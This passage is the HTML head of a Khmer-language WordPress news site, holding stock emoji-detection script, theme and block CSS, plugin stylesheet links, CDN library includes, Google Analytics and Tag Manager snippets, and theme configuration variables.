        var t = new Uint32Array(e.getImageData(0, 0, e.canvas.width, e.canvas.height).data),
          r = (e.clearRect(0, 0, e.canvas.width, e.canvas.height), e.fillText(n, 0, 0), new Uint32Array(e.getImageData(0, 0, e.canvas.width, e.canvas.height).data));
        return t.every(function(e, t) {
          return e === r[t]
        })
      }

      function u(e, t, n) {
        switch (t) {
          case "flag":
            return n(e, "\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f", "\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f") ? !1 : !n(e, "\ud83c\uddfa\ud83c\uddf3", "\ud83c\uddfa\u200b\ud83c\uddf3") && !n(e, "\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f", "\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");
          case "emoji":
            return !n(e, "\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff", "\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")
        }
        return !1
      }

      function f(e, t, n) {
        var r = "undefined" != typeof WorkerGlobalScope && self instanceof WorkerGlobalScope ? new OffscreenCanvas(300, 150) : i.createElement("canvas"),
          a = r.getContext("2d", {
            willReadFrequently: !0
          }),
          o = (a.textBaseline = "top", a.font = "600 32px Arial", {});
        return e.forEach(function(e) {
          o[e] = t(a, e, n)
        }), o
      }

      function t(e) {
        var t = i.createElement("script");
        t.src = e, t.defer = !0, i.head.appendChild(t)
      }
      "undefined" != typeof Promise && (o = "wpEmojiSettingsSupports", s = ["flag", "emoji"], n.supports = {
        everything: !0,
        everythingExceptFlag: !0
      }, e = new Promise(function(e) {
        i.addEventListener("DOMContentLoaded", e, {
          once: !0
        })
      }), new Promise(function(t) {
        var n = function() {
          try {
            var e = JSON.parse(sessionStorage.getItem(o));
            if ("object" == typeof e && "number" == typeof e.timestamp && (new Date).valueOf() < e.timestamp + 604800 && "object" == typeof e.supportTests) return e.supportTests
          } catch (e) {}
          return null
        }();
        if (!n) {
          if ("undefined" != typeof Worker && "undefined" != typeof OffscreenCanvas && "undefined" != typeof URL && URL.createObjectURL && "undefined" != typeof Blob) try {
            var e = "postMessage(" + f.toString() + "(" + [JSON.stringify(s), u.toString(), p.toString()].join(",") + "));",
              r = new Blob([e], {
                type: "text/javascript"
              }),
              a = new Worker(URL.createObjectURL(r), {
                name: "wpTestEmojiSupports"
              });
            return void(a.onmessage = function(e) {
              c(n = e.data), a.terminate(), t(n)
            })
          } catch (e) {}
          c(n = f(s, u, p))
        }
        t(n)
      }).then(function(e) {
        for (var t in e) n.supports[t] = e[t], n.supports.everything = n.supports.everything && n.supports[t], "flag" !== t && (n.supports.everythingExceptFlag = n.supports.everythingExceptFlag && n.supports[t]);
        n.supports.everythingExceptFlag = n.supports.everythingExceptFlag && !n.supports.flag, n.DOMReady = !1, n.readyCallback = function() {
          n.DOMReady = !0
        }
      }).then(function() {
        return e
      }).then(function() {
        var e;
        n.supports.everything || (n.readyCallback(), (e = n.source || {}).concatemoji ? t(e.concatemoji) : e.wpemoji && e.twemoji && (t(e.twemoji), t(e.wpemoji)))
      }))
    }((window, document), window._wpemojiSettings);
    /* ]]> */
  </script>
  <style id="wp-emoji-styles-inline-css" type="text/css">
    img.wp-smiley,
    img.emoji {
      display: inline !important;
      border: none !important;
      box-shadow: none !important;
      height: 1em !important;
      width: 1em !important;
      margin: 0 0.07em !important;
      vertical-align: -0.1em !important;
      background: none !important;
      padding: 0 !important;
    }
  </style>
  <style id="classic-theme-styles-inline-css" type="text/css">
    /*! This file is auto-generated */
    .wp-block-button__link {
      color: #fff;
      background-color: #32373c;
      border-radius: 9999px;
      box-shadow: none;
      text-decoration: none;
      padding: calc(.667em + 2px) calc(1.333em + 2px);
      font-size: 1.125em
    }

    .wp-block-file__button {
      background: #32373c;
      color: #fff;
      text-decoration: none
    }
  </style>
  <style id="global-styles-inline-css" type="text/css">
    body {
      --wp--preset--color--black: #000000;
      --wp--preset--color--cyan-bluish-gray: #abb8c3;
      --wp--preset--color--white: #ffffff;
      --wp--preset--color--pale-pink: #f78da7;
      --wp--preset--color--vivid-red: #cf2e2e;
      --wp--preset--color--luminous-vivid-orange: #ff6900;
      --wp--preset--color--luminous-vivid-amber: #fcb900;
      --wp--preset--color--light-green-cyan: #7bdcb5;
      --wp--preset--color--vivid-green-cyan: #00d084;
      --wp--preset--color--pale-cyan-blue: #8ed1fc;
      --wp--preset--color--vivid-cyan-blue: #0693e3;
      --wp--preset--color--vivid-purple: #9b51e0;
      --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
      --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
      --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
      --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
      --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
      --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
      --wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
      --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
      --wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
      --wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
      --wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
      --wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
      --wp--preset--font-size--small: 11px;
      --wp--preset--font-size--medium: 20px;
      --wp--preset--font-size--large: 32px;
      --wp--preset--font-size--x-large: 42px;
      --wp--preset--font-size--regular: 15px;
      --wp--preset--font-size--larger: 50px;
      --wp--preset--spacing--20: 0.44rem;
      --wp--preset--spacing--30: 0.67rem;
      --wp--preset--spacing--40: 1rem;
      --wp--preset--spacing--50: 1.5rem;
      --wp--preset--spacing--60: 2.25rem;
      --wp--preset--spacing--70: 3.38rem;
      --wp--preset--spacing--80: 5.06rem;
      --wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
      --wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
      --wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
      --wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);
      --wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
    }

    :where(.is-layout-flex) {
      gap: 0.5em;
    }

    :where(.is-layout-grid) {
      gap: 0.5em;
    }

    body .is-layout-flow>.alignleft {
      float: left;
      margin-inline-start: 0;
      margin-inline-end: 2em;
    }

    body .is-layout-flow>.alignright {
      float: right;
      margin-inline-start: 2em;
      margin-inline-end: 0;
    }

    body .is-layout-flow>.aligncenter {
      margin-left: auto !important;
      margin-right: auto !important;
    }

    body .is-layout-constrained>.alignleft {
      float: left;
      margin-inline-start: 0;
      margin-inline-end: 2em;
    }

    body .is-layout-constrained>.alignright {
      float: right;
      margin-inline-start: 2em;
      margin-inline-end: 0;
    }

    body .is-layout-constrained>.aligncenter {
      margin-left: auto !important;
      margin-right: auto !important;
    }

    body .is-layout-constrained> :where(:not(.alignleft):not(.alignright):not(.alignfull)) {
      max-width: var(--wp--style--global--content-size);
      margin-left: auto !important;
      margin-right: auto !important;
    }

    body .is-layout-constrained>.alignwide {
      max-width: var(--wp--style--global--wide-size);
    }

    body .is-layout-flex {
      display: flex;
    }

    body .is-layout-flex {
      flex-wrap: wrap;
      align-items: center;
    }

    body .is-layout-flex>* {
      margin: 0;
    }

    body .is-layout-grid {
      display: grid;
    }

    body .is-layout-grid>* {
      margin: 0;
    }

    :where(.wp-block-columns.is-layout-flex) {
      gap: 2em;
    }

    :where(.wp-block-columns.is-layout-grid) {
      gap: 2em;
    }

    :where(.wp-block-post-template.is-layout-flex) {
      gap: 1.25em;
    }

    :where(.wp-block-post-template.is-layout-grid) {
      gap: 1.25em;
    }

    .has-black-color {
      color: var(--wp--preset--color--black) !important;
    }

    .has-cyan-bluish-gray-color {
      color: var(--wp--preset--color--cyan-bluish-gray) !important;
    }

    .has-white-color {
      color: var(--wp--preset--color--white) !important;
    }

    .has-pale-pink-color {
      color: var(--wp--preset--color--pale-pink) !important;
    }

    .has-vivid-red-color {
      color: var(--wp--preset--color--vivid-red) !important;
    }

    .has-luminous-vivid-orange-color {
      color: var(--wp--preset--color--luminous-vivid-orange) !important;
    }

    .has-luminous-vivid-amber-color {
      color: var(--wp--preset--color--luminous-vivid-amber) !important;
    }

    .has-light-green-cyan-color {
      color: var(--wp--preset--color--light-green-cyan) !important;
    }

    .has-vivid-green-cyan-color {
      color: var(--wp--preset--color--vivid-green-cyan) !important;
    }

    .has-pale-cyan-blue-color {
      color: var(--wp--preset--color--pale-cyan-blue) !important;
    }

    .has-vivid-cyan-blue-color {
      color: var(--wp--preset--color--vivid-cyan-blue) !important;
    }

    .has-vivid-purple-color {
      color: var(--wp--preset--color--vivid-purple) !important;
    }

    .has-black-background-color {
      background-color: var(--wp--preset--color--black) !important;
    }

    .has-cyan-bluish-gray-background-color {
      background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
    }

    .has-white-background-color {
      background-color: var(--wp--preset--color--white) !important;
    }

    .has-pale-pink-background-color {
      background-color: var(--wp--preset--color--pale-pink) !important;
    }

    .has-vivid-red-background-color {
      background-color: var(--wp--preset--color--vivid-red) !important;
    }

    .has-luminous-vivid-orange-background-color {
      background-color: var(--wp--preset--color--luminous-vivid-orange) !important;
    }

    .has-luminous-vivid-amber-background-color {
      background-color: var(--wp--preset--color--luminous-vivid-amber) !important;
    }

    .has-light-green-cyan-background-color {
      background-color: var(--wp--preset--color--light-green-cyan) !important;
    }

    .has-vivid-green-cyan-background-color {
      background-color: var(--wp--preset--color--vivid-green-cyan) !important;
    }

    .has-pale-cyan-blue-background-color {
      background-color: var(--wp--preset--color--pale-cyan-blue) !important;
    }

    .has-vivid-cyan-blue-background-color {
      background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
    }

    .has-vivid-purple-background-color {
      background-color: var(--wp--preset--color--vivid-purple) !important;
    }

    .has-black-border-color {
      border-color: var(--wp--preset--color--black) !important;
    }

    .has-cyan-bluish-gray-border-color {
      border-color: var(--wp--preset--color--cyan-bluish-gray) !important;
    }

    .has-white-border-color {
      border-color: var(--wp--preset--color--white) !important;
    }

    .has-pale-pink-border-color {
      border-color: var(--wp--preset--color--pale-pink) !important;
    }

    .has-vivid-red-border-color {
      border-color: var(--wp--preset--color--vivid-red) !important;
    }

    .has-luminous-vivid-orange-border-color {
      border-color: var(--wp--preset--color--luminous-vivid-orange) !important;
    }

    .has-luminous-vivid-amber-border-color {
      border-color: var(--wp--preset--color--luminous-vivid-amber) !important;
    }

    .has-light-green-cyan-border-color {
      border-color: var(--wp--preset--color--light-green-cyan) !important;
    }

    .has-vivid-green-cyan-border-color {
      border-color: var(--wp--preset--color--vivid-green-cyan) !important;
    }

    .has-pale-cyan-blue-border-color {
      border-color: var(--wp--preset--color--pale-cyan-blue) !important;
    }

    .has-vivid-cyan-blue-border-color {
      border-color: var(--wp--preset--color--vivid-cyan-blue) !important;
    }

    .has-vivid-purple-border-color {
      border-color: var(--wp--preset--color--vivid-purple) !important;
    }

    .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
      background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;
    }

    .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
      background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;
    }

    .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
      background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;
    }

    .has-luminous-vivid-orange-to-vivid-red-gradient-background {
      background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;
    }

    .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
      background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;
    }

    .has-cool-to-warm-spectrum-gradient-background {
      background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;
    }

    .has-blush-light-purple-gradient-background {
      background: var(--wp--preset--gradient--blush-light-purple) !important;
    }

    .has-blush-bordeaux-gradient-background {
      background: var(--wp--preset--gradient--blush-bordeaux) !important;
    }

    .has-luminous-dusk-gradient-background {
      background: var(--wp--preset--gradient--luminous-dusk) !important;
    }

    .has-pale-ocean-gradient-background {
      background: var(--wp--preset--gradient--pale-ocean) !important;
    }

    .has-electric-grass-gradient-background {
      background: var(--wp--preset--gradient--electric-grass) !important;
    }

    .has-midnight-gradient-background {
      background: var(--wp--preset--gradient--midnight) !important;
    }

    .has-small-font-size {
      font-size: var(--wp--preset--font-size--small) !important;
    }

    .has-medium-font-size {
      font-size: var(--wp--preset--font-size--medium) !important;
    }

    .has-large-font-size {
      font-size: var(--wp--preset--font-size--large) !important;
    }

    .has-x-large-font-size {
      font-size: var(--wp--preset--font-size--x-large) !important;
    }

    .wp-block-navigation a:where(:not(.wp-element-button)) {
      color: inherit;
    }

    :where(.wp-block-post-template.is-layout-flex) {
      gap: 1.25em;
    }

    :where(.wp-block-post-template.is-layout-grid) {
      gap: 1.25em;
    }

    :where(.wp-block-columns.is-layout-flex) {
      gap: 2em;
    }

    :where(.wp-block-columns.is-layout-grid) {
      gap: 2em;
    }

    .wp-block-pullquote {
      font-size: 1.5em;
      line-height: 1.6;
    }
  </style>
  <link rel="stylesheet" id="advanced-page-visit-counter-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/advanced-page-visit-counter/public/css/advanced-page-visit-counter-public.css?ver=9.1.1"
    type="text/css" media="all">
  <link rel="stylesheet" id="td-plugin-multi-purpose-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/td-multi-purpose/style.css?ver=3833ae26cf1f9d406448012ce1734aa1"
    type="text/css" media="all">
  <link rel="stylesheet" id="google-fonts-style-css"
    href="https://fonts.googleapis.com/css?family=Open+Sans%3A400%2C600%2C700%7CRoboto%3A400%2C500%2C700%7COdor+Mean+Chey%3A400%7CKantumruy%3A700%2C400%7COpen+Sans%3A900%2C400%7CLato%3A900%2C700%2C400%7CRoboto+Slab%3A400&amp;display=swap&amp;ver=12.6.2"
    type="text/css" media="all">
  <link rel="stylesheet" id="newsletter-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/newsletter/style.css?ver=8.7.5" type="text/css"
    media="all">
  <link rel="stylesheet" id="font_awesome-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/assets/fonts/font-awesome/font-awesome.css?ver=3833ae26cf1f9d406448012ce1734aa1"
    type="text/css" media="all">
  <link rel="stylesheet" id="td-multipurpose-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/assets/fonts/td-multipurpose/td-multipurpose.css?ver=3833ae26cf1f9d406448012ce1734aa1"
    type="text/css" media="all">
  <link rel="stylesheet" id="typicons-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/assets/fonts/typicons/typicons.css?ver=3833ae26cf1f9d406448012ce1734aa1"
    type="text/css" media="all">
  <link rel="stylesheet" id="td-theme-css"
    href="https://www.theseedcambodia.com/wp-content/themes/Newspaper/style.css?ver=12.6.2" type="text/css"
    media="all">
  <style id="td-theme-inline-css" type="text/css">
    @media (max-width:767px) {
      .td-header-desktop-wrap {
        display: none
      }
    }

    @media (min-width:767px) {
      .td-header-mobile-wrap {
        display: none
      }
    }
  </style>
  <link rel="stylesheet" id="wpgdprc-front-css-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/wp-gdpr-compliance/Assets/css/front.css?ver=1706523551"
    type="text/css" media="all">
  <style id="wpgdprc-front-css-inline-css" type="text/css">
    :root {
      --wp-gdpr--bar--background-color: #000000;
      --wp-gdpr--bar--color: #ffffff;
      --wp-gdpr--button--background-color: #000000;
      --wp-gdpr--button--background-color--darken: #000000;
      --wp-gdpr--button--color: #ffffff;
    }
  </style>
  <link rel="stylesheet" id="td-legacy-framework-front-style-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/td-composer/legacy/Newspaper/assets/css/td_legacy_main.css?ver=3833ae26cf1f9d406448012ce1734aa1"
    type="text/css" media="all">
  <link rel="stylesheet" id="tdb_style_cloud_templates_front-css"
    href="https://www.theseedcambodia.com/wp-content/plugins/td-cloud-library/assets/css/tdb_main.css?ver=34c58173fa732974ccb0ca4df5ede162"
    type="text/css" media="all">
  <script type="text/javascript" src="https://www.theseedcambodia.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"
    id="jquery-core-js"></script>
  <script type="text/javascript"
    src="https://www.theseedcambodia.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"
    id="jquery-migrate-js"></script>
  <script type="text/javascript"
    src="https://www.theseedcambodia.com/wp-content/plugins/advanced-page-visit-counter/public/js/advanced-page-visit-counter-public.js?ver=9.1.1"
    id="advanced-page-visit-counter-js"></script>

  <!-- Google tag (gtag.js) snippet added by Site Kit -->

  <!-- Google Analytics snippet added by Site Kit -->
  <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-TR8R32W8F6" id="google_gtagjs-js"
    async=""></script>
  <script type="text/javascript" id="google_gtagjs-js-after">
    /* <![CDATA[ */
    window.dataLayer = window.dataLayer || [];

    function gtag() {
      dataLayer.push(arguments);
    }
    gtag("set", "linker", {
      "domains": ["www.theseedcambodia.com"]
    });
    gtag("js", new Date());
    gtag("set", "developer_id.dZTNiMT", true);
    gtag("config", "G-TR8R32W8F6");
    /* ]]> */
  </script>

  <!-- End Google tag (gtag.js) snippet added by Site Kit -->
  <script type="text/javascript" id="wpgdprc-front-js-js-extra">
    /* <![CDATA[ */
    var wpgdprcFront = {
      "ajaxUrl": "https:\/\/www.theseedcambodia.com\/wp-admin\/admin-ajax.php",
      "ajaxNonce": "56d0152781",
      "ajaxArg": "security",
      "pluginPrefix": "wpgdprc",
      "blogId": "1",
      "isMultiSite": "",
      "locale": "en_US",
      "showSignUpModal": "",
      "showFormModal": "",
      "cookieName": "wpgdprc-consent",
      "consentVersion": "",
      "path": "\/",
      "prefix": "wpgdprc"
    };
    /* ]]> */
  </script>
  <script type="text/javascript"
    src="https://www.theseedcambodia.com/wp-content/plugins/wp-gdpr-compliance/Assets/js/front.min.js?ver=1706523551"
    id="wpgdprc-front-js-js"></script>
  <link rel="https://api.w.org/" href="https://www.theseedcambodia.com/wp-json/">
  <link rel="alternate" type="application/json" href="https://www.theseedcambodia.com/wp-json/wp/v2/pages/6574">
  <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.theseedcambodia.com/xmlrpc.php?rsd">
  <meta name="generator" content="WordPress 6.4.5">
  <link rel="shortlink" href="https://www.theseedcambodia.com/">
  <link rel="alternate" type="application/json+oembed"
    href="https://www.theseedcambodia.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.theseedcambodia.com%2F">
  <link rel="alternate" type="text/xml+oembed"
    href="https://www.theseedcambodia.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.theseedcambodia.com%2F&amp;format=xml">
  <meta name="generator" content="Site Kit by Google 1.148.0">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
  <link
    href="https://fonts.googleapis.com/css2?family=Battambang:wght@400;700&amp;family=Hanuman:wght@400;700&amp;family=Kantumruy:wght@300;400;700&amp;family=Siemreap&amp;display=swap"
    rel="stylesheet">
  <link rel="icon" href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-32x32.png"
    sizes="32x32">
  <link rel="icon" href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-192x192.png"
    sizes="192x192">
  <link rel="apple-touch-icon"
    href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-180x180.png">
  <meta name="msapplication-TileImage"
    content="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-270x270.png">

  <!-- Google Tag Manager -->
  <script>
    (function(w, d, s, l, i) {
      w[l] = w[l] || [];
      w[l].push({
        'gtm.start': new Date().getTime(),
        event: 'gtm.js'
      });
      var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s),
        dl = l != 'dataLayer' ? '&l=' + l : '';
      j.async = true;
      j.src =
        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
      f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-WG2S4ZV');
  </script>
  <!-- End Google Tag Manager --><!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
  <script>
    window.tdb_global_vars = {
      "wpRestUrl": "https:\/\/www.theseedcambodia.com\/wp-json\/",
      "permalinkStructure": "\/article\/%post_id%\/"
    };
    window.tdb_p_autoload_vars = {
      "isAjax": false,
      "isAdminBarShowing": false,
      "autoloadScrollPercent": 50
    };
  </script>
  <!-- JS generated by theme -->

  <script>
    var tdBlocksArray = []; //here we store all the items for the current page

    // td_block class - each ajax block uses a object of this class for requests
    function tdBlock() {
      this.id = '';
      this.block_type = 1; //block type id (1-234 etc)
      this.atts = '';
      this.td_column_number = '';
      this.td_current_page = 1; //
      this.post_count = 0; //from wp
      this.found_posts = 0; //from wp
      this.max_num_pages = 0; //from wp
      this.td_filter_value = ''; //current live filter value
      this.is_ajax_running = false;
      this.td_user_action = ''; // load more or infinite loader (used by the animation)
      this.header_color = '';
      this.ajax_pagination_infinite_stop = ''; //show load more at page x
    }

    // td_js_generator - mini detector
    (function() {
      var htmlTag = document.getElementsByTagName("html")[0];

      if (navigator.userAgent.indexOf("MSIE 10.0") > -1) {
        htmlTag.className += ' ie10';
      }

      if (!!navigator.userAgent.match(/Trident.*rv\:11\./)) {
        htmlTag.className += ' ie11';
      }

      if (navigator.userAgent.indexOf("Edge") > -1) {
        htmlTag.className += ' ieEdge';
      }

      if (/(iPad|iPhone|iPod)/g.test(navigator.userAgent)) {
        htmlTag.className += ' td-md-is-ios';
      }

      var user_agent = navigator.userAgent.toLowerCase();
      if (user_agent.indexOf("android") > -1) {
        htmlTag.className += ' td-md-is-android';
      }

      if (-1 !== navigator.userAgent.indexOf('Mac OS X')) {
        htmlTag.className += ' td-md-is-os-x';
      }

      if (/chrom(e|ium)/.test(navigator.userAgent.toLowerCase())) {
        htmlTag.className += ' td-md-is-chrome';
      }

      if (-1 !== navigator.userAgent.indexOf('Firefox')) {
        htmlTag.className += ' td-md-is-firefox';
      }

      if (-1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome')) {
        htmlTag.className += ' td-md-is-safari';
      }

      if (-1 !== navigator.userAgent.indexOf('IEMobile')) {
        htmlTag.className += ' td-md-is-iemobile';
      }

    })();

    var tdLocalCache = {};

    (function() {
      "use strict";

      tdLocalCache = {
        data: {},
        remove: function(resource_id) {
          delete tdLocalCache.data[resource_id];
        },
        exist: function(resource_id) {
          return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
        },
        get: function(resource_id) {
          return tdLocalCache.data[resource_id];
        },
        set: function(resource_id, cachedData) {
          tdLocalCache.remove(resource_id);
          tdLocalCache.data[resource_id] = cachedData;
        }
      };
    })();



    var td_viewport_interval_list = [{
      "limitBottom": 767,
      "sidebarWidth": 228
    }, {
      "limitBottom": 1018,
      "sidebarWidth": 300
    }, {
      "limitBottom": 1140,
      "sidebarWidth": 324
    }];
    var td_animation_stack_effect = "type1";
    var tds_animation_stack = true;
    var td_animation_stack_specific_selectors = ".entry-thumb, img[class*=\"wp-image-\"], a.td-sml-link-to-image > img, .td-lazy-img";
    var td_animation_stack_general_selectors = ".td-animation-stack .entry-thumb, .post .entry-thumb, .post img[class*=\"wp-image-\"], .post a.td-sml-link-to-image > img, .td-animation-stack .td-lazy-img";
    var tds_general_modal_image = "yes";
    var tdc_is_installed = "yes";
    var td_ajax_url = "https:\/\/www.theseedcambodia.com\/wp-admin\/admin-ajax.php?td_theme_name=Newspaper&v=12.6.2";
    var td_get_template_directory_uri = "https:\/\/www.theseedcambodia.com\/wp-content\/plugins\/td-composer\/legacy\/common";
    var tds_snap_menu = "";
    var tds_logo_on_sticky = "";
    var tds_header_style = "";
    var td_please_wait = "\u179f\u17bc\u1798\u200b\u179a\u1784\u17cb\u1785\u17b6\u17c6 ...";
    var td_email_user_pass_incorrect = "\u17a2\u17d2\u1793\u1780\u200b\u1794\u17d2\u179a\u17be\u200b\u17ac\u200b\u1796\u17b6\u1780\u17d2\u1799\u200b\u179f\u1798\u17d2\u1784\u17b6\u178f\u17cb\u200b\u1798\u17b7\u1793\u200b\u178f\u17d2\u179a\u17b9\u1798\u178f\u17d2\u179a\u17bc\u179c\u200b!";
    var td_email_user_incorrect = "\u17a2\u17ca\u17b8\u200b\u1798\u17c9\u17c2\u200b\u179b\u200b\u17ac\u200b\u1788\u17d2\u1798\u17c4\u17c7\u200b\u17a2\u17d2\u1793\u1780\u200b\u1794\u17d2\u179a\u17be\u200b\u1798\u17b7\u1793\u200b\u178f\u17d2\u179a\u17b9\u1798\u178f\u17d2\u179a\u17bc\u179c\u200b!";
    var td_email_incorrect = "\u17a2\u17ca\u17b8\u200b\u1798\u17c9\u17c2\u200b\u179b\u200b\u178a\u17c2\u179b\u200b\u1798\u17b7\u1793\u200b\u178f\u17d2\u179a\u17b9\u1798\u178f\u17d2\u179a\u17bc\u179c\u200b!";
    var td_user_incorrect = "Username incorrect!";
    var td_email_user_empty = "Email or username empty!";
    var td_pass_empty = "Pass empty!";
    var td_pass_pattern_incorrect = "Invalid Pass Pattern!";
    var td_retype_pass_incorrect = "Retyped Pass incorrect!";
    var tds_more_articles_on_post_enable = "";
    var tds_more_articles_on_post_time_to_wait = "";
    var tds_more_articles_on_post_pages_distance_from_top = 0;
    var tds_captcha = "";
    var tds_theme_color_site_wide = "#bb0101";
    var tds_smart_sidebar = "";
    var tdThemeName = "Newspaper";
    var tdThemeNameWl = "Newspaper";
    var td_magnific_popup_translation_tPrev = "(\u1782\u17d2\u179a\u17b6\u1794\u17cb\u1785\u17bb\u1785\u200b\u1796\u17d2\u179a\u17bd\u1789\u200b\u1786\u17d2\u179c\u17c1\u1784\u200b) \u1798\u17bb\u1793";
    var td_magnific_popup_translation_tNext = "(\u1782\u17d2\u179a\u17b6\u1794\u17cb\u1785\u17bb\u1785\u200b\u1796\u17d2\u179a\u17bd\u1789\u200b\u179f\u17d2\u178a\u17b6\u17c6\u200b) \u1780\u17d2\u179a\u17c4\u1799";
    var td_magnific_popup_translation_tCounter = "%curr% \u1793\u17c3 %total%";
    var td_magnific_popup_translation_ajax_tError = "\u1798\u17b6\u178f\u17b7\u1780\u17b6\u200b\u1796\u17b8 %url% \u1798\u17b7\u1793\u200b\u17a2\u17b6\u1785\u200b\u178f\u17d2\u179a\u17bc\u179c\u200b\u1794\u17b6\u1793\u200b\u1795\u17d2\u1791\u17bb\u1780\u200b\u17d4";
    var td_magnific_popup_translation_image_tError = "#%curr% \u179a\u17bc\u1794\u1797\u17b6\u1796\u200b\u1798\u17b7\u1793\u200b\u17a2\u17b6\u1785\u200b\u1795\u17d2\u1791\u17bb\u1780\u200b\u17d4";
    var tdBlockNonce = "3ff47ac64b";
    var tdMobileMenu = "enabled";
    var tdMobileSearch = "enabled";
    var tdDateNamesI18n = {
      "month_names": ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
      "month_names_short": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
      "day_names": ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
      "day_names_short": ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"]
    };
    var tdb_modal_confirm = "Save";
    var tdb_modal_cancel = "Cancel";
    var tdb_modal_confirm_alt = "Yes";
    var tdb_modal_cancel_alt = "No";
    var td_ad_background_click_link = "";
    var td_ad_background_click_target = "";
  </script>
